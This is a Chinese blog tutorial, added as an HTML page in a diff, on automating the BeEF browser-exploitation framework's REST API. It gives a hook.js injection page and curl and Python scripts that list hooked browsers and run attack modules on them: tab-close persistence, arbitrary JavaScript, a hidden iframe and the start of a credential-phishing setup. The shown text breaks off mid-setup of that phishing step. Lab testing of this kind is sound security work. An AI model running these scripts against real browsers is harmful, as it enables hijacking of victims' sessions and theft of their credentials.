@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            利用BeEF REST API自动化控制僵尸主机 |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">利用BeEF REST API自动化控制僵尸主机</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2017-06-25 09:42:00</span>
+        <span class="mobile">2017-06-25 09:42</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/">神兵利器</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/BeEF/">BeEF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/XSS/">XSS</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="利用BeEF-REST-API自动化控制僵尸主机"><a href="#利用BeEF-REST-API自动化控制僵尸主机" class="headerlink" title="利用BeEF REST API自动化控制僵尸主机"></a>利用BeEF REST API自动化控制僵尸主机</h1><p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171626.png" alt="img"></p>
+<h1 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h1><p> 　　关于BeEF，不再多介绍，它的强大毋庸置疑，利用它我们可以做很多事情。最近的一些实验，需要用beef批量自动进行控制，发现网上也没有过多关于这方面内容的介绍，于是学习了一下它的API，顺便练习一下python编程，这里把自己的学习内容分享下。本文涉及的一些内容可能具有一定的攻击性，请遵守国家法律，禁止用于非法用途。</p>
+<h1 id="二-通过API控制beef"><a href="#二-通过API控制beef" class="headerlink" title="二. 通过API控制beef"></a>二. 通过API控制beef</h1><p>　　BeEF从0.4.3.3,版本开始，提供了静态API接口，用户可以通过发送HTTP &#x2F; JSON请求控制Beef。</p>
+<p>　　我们可以通过程序，批量自动加载执行某些beef的模块，实现比如自动维持权限，Getshell等功能。</p>
+<p>　　在后面的正文里，每一个调用模块的示例中，我都会尝试单独编写代码进行测试，最后，我会将各个部分组合起来，实现一个自动化控制的小demo。本文涉及到的所有代码你都可以在这里找到：<a class="link"   target="_blank" rel="noopener" href="https://github.com/ssooking/AutoBeef/" >https://github.com/ssooking/AutoBeef/<i class="fas fa-external-link-alt"></i></a>。进入正题，我们先启动beef。本机IP：192.168.1.133</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">默认hook js：http://192.168.1.133:3000/hook.js</span><br><span class="line">默认hook页面： http://192.168.1.133:3000/demos/basic.html</span><br><span class="line">默认管理界面：  http://192.168.1.133:3000/ui/panel</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171635.png" alt="img"></p>
+<p>　　当我们启动beef的时候，会自动生成一个静态API key，这个key用于身份认证，我们每次通过API进行控制时，都要添加这个参数值 。需要提到的是，如果你发现后文的API key，session等参数值发生了变化，是因为这篇文章不是一次写完的，测试时因为重新开启beef产生了变化，因此不要纠结，我们应该关注API如何调用。</p>
+<p>下面，我们可以创建一个简单的hook页面 ，如xss.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.1.133:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>　　我们也可以访问默认hook页面<code> http://192.168.1.133:3000/demos/basic.html</code>，为了测试，这里我使用了一台虚拟机，本机也使一个浏览器被hook。在管理面板可以看到主机已经上线。</p>
+<p> <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171641.png" alt="img"></p>
+<p>　　在控制台，我们能够直接看到被hook的主机，并执行相关攻击模块。那么怎样通过API实现这些功能呢？下面，我们将通过实例进行介绍。在此之前，我们需要知道的是，用于处理我们的API请求的文件，主要存放于beef框架下core目录和core&#x2F;api目录下，我们可以在该目录下查找并阅读相关源代码，了解功能的实现机制，使用API进行HTTP交互时，默认的交互数据类型为json。</p>
+<h2 id="获取API-Key"><a href="#获取API-Key" class="headerlink" title="获取API Key"></a>获取API Key</h2><p>&#x2F;api&#x2F;admin&#x2F;login是用户登录接口，通过该接口登录之后，我们可以得到用于会话认证的API key</p>
+<p>我们用curl命令，使用默认的口令提交登录请求，会返回我们的key。这个功能可以被用于后文编写自动化控制脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Content-Type: application/json&quot;</span> -X POST -d <span class="string">&#x27;&#123;&quot;username&quot;:&quot;beef&quot;, &quot;password&quot;:&quot;beef&quot;&#125;&#x27;</span> http://192.168.1.133:3000/api/admin/login</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171646.png" alt="img"></p>
+<p>我们可以用下面这样一个简单的小脚本实现，代码也比较简单，不再多废话</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># ** Author: ssooking</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getauthkey</span>(<span class="params">host</span>):</span><br><span class="line">    apiurl =  host + <span class="string">&quot;api/admin/login&quot;</span></span><br><span class="line">    logindata = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;beef&quot;</span>, </span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;beef&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    jdata = json.dumps(logindata)             <span class="comment"># 对数据进行JSON格式化编码</span></span><br><span class="line">    req = urllib2.Request(apiurl, jdata)      <span class="comment"># 生成页面请求的完整数据</span></span><br><span class="line">    response = urllib2.urlopen(req)           <span class="comment"># 发送页面请求</span></span><br><span class="line">    resdata = response.read()                 <span class="comment"># 获取服务器返回的页面信息，数据类型为str</span></span><br><span class="line">    jsondata =  json.loads(resdata)           <span class="comment"># 把数据解析成python对象，此时返回dict数据      </span></span><br><span class="line">    <span class="keyword">return</span> jsondata[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://192.168.1.133:3000/&quot;</span></span><br><span class="line">    <span class="built_in">print</span> getauthkey(host)</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取hook主机列表"><a href="#获取hook主机列表" class="headerlink" title="获取hook主机列表"></a>获取hook主机列表</h2><p>API中，我们要获取hook主机信息的api接口为：api&#x2F;hooks。提交请求的格式类似于这样： api&#x2F;hooks?token&#x3D;xxxxx。需要的参数token的值是用于身份认证的API key。我们用curl命令发送请求，获取hook主机列表信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.1.133:3000/api/hooks?token=641640ae3ce89c4da45ee98de341f3e858f62bd3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171650.png" alt="img"></p>
+<p>返回了当前hook的主机情况，返回的json数据格式不太友好，作为测试，我们可以使用json代码格式化工具便于查看。</p>
+<p>这里是一个不错的在线json编辑工具：<a class="link"   target="_blank" rel="noopener" href="http://tool.lu/json/" >http://tool.lu/json/<i class="fas fa-external-link-alt"></i></a>。我们也可以直接在浏览器中访问url，但是后文涉及提交某些必要的参数时，不能使用这种方式。</p>
+<p>json代码经过格式化之后，我们可以看到，有两个主机上线。每个上线主机都有id号来表示身份。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171653.png" alt="img"></p>
+<p><strong>session参数值是后面通过A{I调用执行beef模块时必须的参数，这个值你也可以在Web控制台的Cookie处找到。</strong></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171657.png" alt="img"></p>
+<p>我们也可以通过脚本发送类似的请求实现这个获取这些信息，比如下面这个简单的示例代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment"># ** Author: ssooking</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getHookedBrowsers</span>(<span class="params">host,authkey</span>):</span><br><span class="line">    f = urllib2.urlopen(host + <span class="string">&quot;/api/hooks?token=&quot;</span> + authkey)</span><br><span class="line">    data = json.loads(f.read())</span><br><span class="line">    hooked = data[<span class="string">&quot;hooked-browsers&quot;</span>][<span class="string">&quot;online&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span> hooked</span><br><span class="line">    <span class="keyword">return</span> hooked</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://192.168.1.133:3000/&quot;</span></span><br><span class="line">    key = <span class="string">&quot;e7170da7263c46d8e505ab044017707107a2ee6f&quot;</span></span><br><span class="line">    getHookedBrowsers(host,key)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171702.png" alt="img"></p>
+<p><strong>如果你想知道某个被hook主机的详细信息，只要加上浏览器session值即可，它的请求格式应该是这样的</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/hooks/浏览器session会话值?token=xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>再来说说怎样调用模块，这部分功能是由&#x2F;api&#x2F;modules.rb控制的</p>
+<h2 id="列举可调用的模块信息"><a href="#列举可调用的模块信息" class="headerlink" title="列举可调用的模块信息"></a>列举可调用的模块信息</h2><p>我们通过&#x2F;api&#x2F;modules接口列举出可以调用的模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.1.133:3000/api/modules?token=641640ae3ce89c4da45ee98de341f3e858f62bd3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171707.png" alt="img"></p>
+<p>返回的格式不友好，我们直接在浏览器里访问</p>
+<p> <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171712.png" alt="img"></p>
+<p>我们可以发现，每一个模块都有对应的id号。我们在beef控制台里随便找一个，也可以找到这个id。但是需要注意一下，这个id号会因为你BeEF模块数目的不同有所变化，在编写代码之前你应该确认这个id号。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171717.png" alt="img"></p>
+<p> 　  <strong>如果你请求的格式像这样： &#x2F;api&#x2F;modules&#x2F;130?token&#x3D;xxxxx ， 即modules后面加上了具体的模块id号，那么可以得到这个模块的详细信息，比如需要的参数等</strong></p>
+<p>　　所以，如果想要调用某个模块，我们只需要知道这个模块的id，并且在发送请求的的时候提供该模块需要的参数即可。</p>
+<p>　　执行模块时请求的格式是这样的　&#x2F;api&#x2F;modules&#x2F;:session&#x2F;:module_id （session是被hook的浏览器会话，module_id即为beef模块的id号）</p>
+<p>　　需要注意的是，提交参数时，Content-Type必须为json类型,字符集为 UTF-8，并且请求的主体内容必须是有效的json数据，这在后文有实例。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171721.png" alt="img"></p>
+<h2 id="执行BeEF模块"><a href="#执行BeEF模块" class="headerlink" title="执行BeEF模块"></a>执行BeEF模块</h2><p>　　举个调用例子。</p>
+<p>　　这里使用一个简单的权限维持模块 Confirm Close Tab。这个模块的作用是，受害者在试图关闭选项卡时会向用户显示”关闭确认”对话框，通过这种方式来增加shell的存活时间。相关功能的模块还有 Man-In-The-Browser，Create Foreground iFrame，Create Pop Under。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171726.png" alt="img"></p>
+<p>我们可以看到，这个模块id为177，不需要提供其他参数，那么我们可以用curl模拟这种格式的请求来执行该模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H <span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span> -d <span class="string">&#x27;&#123;&#125;&#x27;</span> http://xxxxx/api/modules/浏览器session/模块<span class="built_in">id</span>?token=xxxx</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171731.png" alt="img"></p>
+<p>虽然模块不需要额外的参数，但是因为请求主体必须为json格式，所以我们用 -d ‘{}’ 发送空数据。此时beef终端会有执行成功的提示。</p>
+<p>如果你没有这个参数，就会报如图中 Invalid JSON input for module ‘177’  的错误</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171735.png" alt="img"></p>
+<p> 在浏览器中验证，当我们点击关闭这个页面时，会弹出确认框，说明成功加载了这个模块。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171743.png" alt="img"></p>
+<p>同样的，我们可以编写脚本执行该模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment"># ** Author: ssooking</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendConfirm</span>(<span class="params">host, sessionId, authkey</span>):</span><br><span class="line">    postdata = <span class="string">&#x27;&#123;&#125;&#x27;</span></span><br><span class="line">    url = host + <span class="string">&quot;api/modules/&quot;</span> + sessionId + <span class="string">&quot;/177?token=&quot;</span> + authkey</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] URL: &quot;</span> + url</span><br><span class="line">    req = urllib2.Request(url, postdata)</span><br><span class="line">    req.add_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; charset=UTF-8&quot;</span>)</span><br><span class="line">    f = urllib2.urlopen(req)</span><br><span class="line">    <span class="built_in">print</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://192.168.1.133:3000/&quot;</span></span><br><span class="line">    sessionId = <span class="string">&quot;tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU&quot;</span></span><br><span class="line">    key = <span class="string">&quot;e7170da7263c46d8e505ab044017707107a2ee6f&quot;</span></span><br><span class="line">    sendConfirm(host,sessionId,key)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171748.png" alt="img"></p>
+<p> 来一个带参数的例子，这次我使用的是Raw JavaScript模块，这个模块允许我们在目标浏览器上执行javascript代码。注意，这些javascript代码不能经过特殊编码。</p>
+<p> <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171752.png" alt="img"></p>
+<p>这个模块的id号为169，我们再来看看它需要的参数，通过下面这样的请求获取模块详细信息</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171758.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171801.png" alt="img"></p>
+<p>需要提供的参数名为：”cmd”，参数内容是我们要执行的Javascript代码，我们可以用curl构造请求进行测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H <span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span> -d <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;alert(\ssooking\);&quot;&#125;&#x27;</span> http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/169?token=dadd1be063d3a3b4339d84f5bdbbcbb25616b41d36a3b062697706d9f2d5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171806.png" alt="img"></p>
+<p>因为不能用多个单引号，所以我用alert(&#x2F;ssooking&#x2F;)代替，但是没有弹出窗口，不过我使用自己编写的脚本执行这个模块就可以成功执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment"># ** Author: ssooking</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execJavascript</span>(<span class="params">host, sessionId, authkey</span>):</span><br><span class="line"></span><br><span class="line">    payload=&#123;</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;alert(&#x27;Hello ssooking!&#x27;);&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    apiurl = host + <span class="string">&quot;api/modules/&quot;</span> + sessionId + <span class="string">&quot;/169?token=&quot;</span> + authkey</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] URL: &quot;</span> + apiurl</span><br><span class="line">    jdata = json.dumps(payload) </span><br><span class="line">    req = urllib2.Request(apiurl, jdata) </span><br><span class="line">    req.add_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; charset=UTF-8&quot;</span>)</span><br><span class="line">    response = urllib2.urlopen(req)  </span><br><span class="line">    resdata = response.read()                 </span><br><span class="line">    <span class="keyword">return</span> resdata</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://192.168.1.133:3000/&quot;</span></span><br><span class="line">    sessionId = <span class="string">&quot;ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso&quot;</span></span><br><span class="line">    key = <span class="string">&quot;dadd1be063d3a3b4339d84f5bdbbcbb25616b41d&quot;</span></span><br><span class="line">    <span class="built_in">print</span> execJavascript(host,sessionId,key)</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171812.png" alt="img"></p>
+<p>弹出了窗口</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171816.png" alt="img"></p>
+<p>再举个带参数的例子，这次我使用的是Create Invisible Iframe模块，它的功能是创建一个隐藏的Frame。</p>
+<p>这个模块的id为174，需要的参数是隐藏的Frame所指向的url地址</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171819.png" alt="img"></p>
+<p>先查看一下模块的详细参数</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171824.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171830.png" alt="img"></p>
+<p>可以看到，这个请求的这个url参数名为”target”。下面进行测试，我们使用python创建一个简单的HTTP服务器</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171835.png" alt="img"></p>
+<p>我们用curl构造请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H <span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span> -d <span class="string">&#x27;&#123;&quot;target&quot;:&quot;http://192.168.1.133:8000/&quot;&#125;&#x27;</span> http://192.168.1.133:3000/api/modules/tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU/174?token=32c75b5e91ef4e519da119349d2c0cbd7cd23259</span><br></pre></td></tr></table></figure>
+
+<p>执行成功，python HTTP上成功回显，说明我们在目标的浏览器上创建了一个隐藏的iframe，并使其访问了这个url地址</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171839.png" alt="img"></p>
+<p> <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171842.png" alt="img"></p>
+<h2 id="获取模块执行结果"><a href="#获取模块执行结果" class="headerlink" title="获取模块执行结果"></a>获取模块执行结果</h2><p>有些模块执行完毕后，我们需要获取返回的数据，比如凭证欺骗模块Pretty Theft，我们想要获取用户输入的认证口令。</p>
+<p>我们使用一个简单的windows凭证认证模板</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171846.png" alt="img"></p>
+<p>这时候目标浏览器上会弹出认证框</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171851.png" alt="img"></p>
+<p>模拟提交了凭证之后，从beef的执行结果中，我们可以看到欺骗到的密码</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171855.png" alt="img"></p>
+<p>下面就通过API调用执行该模块，先看下参数</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171859.png" alt="img"></p>
+<p>查看模块详细信息，我们可以知道，需要设置的参数有：欺骗对话框类型”choice”，背景风格”backing”，Logo的图片地址”imgsauce” ，因此请求示例应该像这样：</p>
